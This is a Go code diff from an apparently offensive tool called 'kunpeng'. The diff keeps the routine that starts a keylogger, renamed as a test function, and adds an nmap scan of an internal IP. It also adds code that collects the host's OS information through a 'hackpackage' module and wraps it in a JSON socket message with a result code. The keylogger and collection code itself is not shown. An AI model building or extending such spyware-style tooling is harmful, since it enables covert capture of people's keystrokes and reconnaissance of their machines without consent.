@@ -1,7 +1,11 @@
 package main
 
 import (
+	"encoding/json"
+	"kunpeng/config"
+	"kunpeng/hackpackage"
 	"kunpeng/keylogger"
+	"kunpeng/service"
 	"time"
 )
 
@@ -17,8 +21,15 @@ import (
 //	var input string
 //	fmt.Scanln(&input)
 //}
-func main() {
+type SocketInfo struct {
+	ResultCode int
+	ResultMsg  string
+}
 
+func main() {
+	testJson()
+}
+func TestKeyogger() {
 	if !keylogger.StartKeyLogger() {
 		print("stepone :keylogger has running!")
 	}
@@ -40,5 +51,18 @@ func main() {
 	if !keylogger.StartKeyLogger() {
 		print("steptwo :keylogger has running!")
 	}
+}
+func TestNmap() {
+
+	service.GetNmapInfoFromIp("10.59.13.137")
+
+}
+func testJson() {
+	msg := SocketInfo{config.Result_Code_ReturnOsInfo, hackpackage.GetOSInformation()}
+	print(msg.ResultMsg)
+	print(msg.ResultCode)
+	jsonstring, err := json.Marshal(&msg)
+	print(err)
+	print(string(jsonstring))
 
 }
